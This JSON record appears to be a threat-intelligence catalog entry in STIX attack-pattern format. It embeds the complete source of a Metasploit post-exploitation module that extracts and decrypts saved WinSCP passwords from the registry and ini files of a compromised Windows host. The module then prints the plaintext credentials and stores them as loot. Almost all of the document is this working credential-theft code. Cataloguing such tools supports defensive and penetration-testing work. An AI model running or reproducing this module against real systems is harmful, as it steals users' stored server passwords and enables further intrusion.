{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e872d52a-842d-4b96-b3aa-b0f399f1977f",
    "created": "2024-08-14T16:33:08.239034Z",
    "modified": "2024-08-14T16:33:08.239038Z",
    "name": "Windows Gather WinSCP Saved Password Extraction",
    "description": " This module extracts weakly encrypted saved passwords from WinSCP. It searches for saved sessions in the Windows Registry and the WinSCP.ini file. It cannot decrypt passwords if a master password is used.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/winscp.rb",
            "external_id": "winscp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::File\n  include Rex::Parser::WinSCP\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather WinSCP Saved Password Extraction',\n        'Description' => %q{\n          This module extracts weakly encrypted saved passwords from\n          WinSCP. It searches for saved sessions in the Windows Registry\n          and the WinSCP.ini file. It cannot decrypt passwords if a master\n          password is used.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'theLightCosine'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_net_resolve_host\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def get_reg\n    # Enumerate all the SID in HKEY_Users and see if any of them have WinSCP RegistryKeys.\n    regexists = 0\n\n    userhives = load_missing_hives\n    userhives.each do |hive|\n      next if hive['HKU'].nil?\n\n      master_key = \"#{hive['HKU']}\\\\Software\\\\Martin Prikryl\\\\WinSCP 2\\\\Configuration\\\\Security\"\n      masterpw = registry_getvaldata(master_key, 'UseMasterPassword')\n\n      # No WinSCP Keys here\n      next if masterpw.nil?\n\n      regexists = 1\n      if masterpw == 1\n        # Master Password used to add AES256 encryption to stored password\n        print_error(\"User #{hive['HKU']} is using a Master Password, cannot recover passwords\")\n        next\n\n      else\n        # Take a look at any saved sessions\n        savedpwds = 0\n        session_key = \"#{hive['HKU']}\\\\Software\\\\Martin Prikryl\\\\WinSCP 2\\\\Sessions\"\n        saved_sessions = registry_enumkeys(session_key)\n        next if saved_sessions.nil?\n\n        saved_sessions.each do |saved_session|\n          # Skip default settings entry\n          next if saved_session == 'Default%20Settings'\n\n          active_session = \"#{hive['HKU']}\\\\Software\\\\Martin Prikryl\\\\WinSCP 2\\\\Sessions\\\\#{saved_session}\"\n          password = registry_getvaldata(active_session, 'Password')\n          # There is no password saved for this session, so we skip it\n          next if password.nil?\n\n          savedpwds = 1\n          portnum = registry_getvaldata(active_session, 'PortNumber')\n          if portnum.nil?\n            # If no explicit port number entry exists, it is set to default port of tcp22\n            portnum = 22\n          end\n\n          encrypted_password = password\n          user = registry_getvaldata(active_session, 'UserName') || ''\n          fsprotocol = registry_getvaldata(active_session, 'FSProtocol') || ''\n          sname = parse_protocol(fsprotocol)\n          host = registry_getvaldata(active_session, 'HostName') || ''\n\n          plaintext = decrypt_password(encrypted_password, \"#{user}#{host}\")\n\n          winscp_store_config({\n            hostname: host,\n            username: user,\n            password: plaintext,\n            portnumber: portnum,\n            protocol: sname\n          })\n        end\n\n        if savedpwds == 0\n          print_status('No Saved Passwords found in the Session Registry Keys')\n        end\n      end\n    end\n\n    if regexists == 0\n      print_status('No WinSCP Registry Keys found!')\n    end\n    unload_our_hives(userhives)\n  end\n\n  def run\n    print_status('Looking for WinSCP.ini file storage...')\n\n    # WinSCP is only x86...\n    if sysinfo['Architecture'] == 'x86'\n      prog_files_env = 'ProgramFiles'\n    else\n      prog_files_env = 'ProgramFiles(x86)'\n    end\n    env = get_envs('APPDATA', prog_files_env, 'USERNAME')\n\n    if env['APPDATA'].nil?\n      fail_with(Failure::Unknown, 'Target does not have environment variable APPDATA')\n    elsif env[prog_files_env].nil?\n      fail_with(Failure::Unknown, \"Target does not have environment variable #{prog_files_env}\")\n    elsif env['USERNAME'].nil?\n      fail_with(Failure::Unknown, 'Target does not have environment variable USERNAME')\n    end\n\n    user_dir = \"#{env['APPDATA']}\\\\..\\\\..\"\n    user_dir << '\\\\..' if user_dir.include?('Users')\n\n    users = dir(user_dir)\n    users.each do |user|\n      next if user == '.' || user == '..'\n\n      app_data = \"#{env['APPDATA'].gsub(env['USERNAME'], user)}\\\\WinSCP.ini\"\n      vprint_status(\"Looking for #{app_data}...\")\n      get_ini(app_data) if file?(app_data)\n    end\n\n    program_files = \"#{env[prog_files_env]}\\\\WinSCP\\\\WinSCP.ini\"\n\n    get_ini(program_files) if file?(program_files)\n\n    print_status('Looking for Registry storage...')\n    get_reg\n  end\n\n  def get_ini(file_path)\n    print_good(\"WinSCP.ini located at #{file_path}\")\n    file = read_file(file_path)\n    stored_path = store_loot('winscp.ini', 'text/plain', session, file, 'WinSCP.ini', file_path)\n    print_good(\"WinSCP saved to loot: #{stored_path}\")\n    parse_ini(file).each do |res|\n      winscp_store_config(res)\n    end\n  end\n\n  def winscp_store_config(config)\n    begin\n      res = client.net.resolve.resolve_host(config[:hostname], AF_INET)\n      ip = res[:ip] if res\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Unable to store following credentials in database as we are unable to resolve the IP address: #{e}\")\n    ensure\n      print_good(\"Host: #{config[:hostname]}, IP: #{ip}, Port: #{config[:portnumber]}, Service: #{config[:protocol]}, Username: #{config[:username]}, Password: #{config[:password]}\")\n    end\n\n    return unless ip\n\n    service_data = {\n      address: ip,\n      port: config[:portnumber],\n      service_name: config[:protocol],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      private_type: :password,\n      private_data: config[:password],\n      username: config[:username]\n    }.merge(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}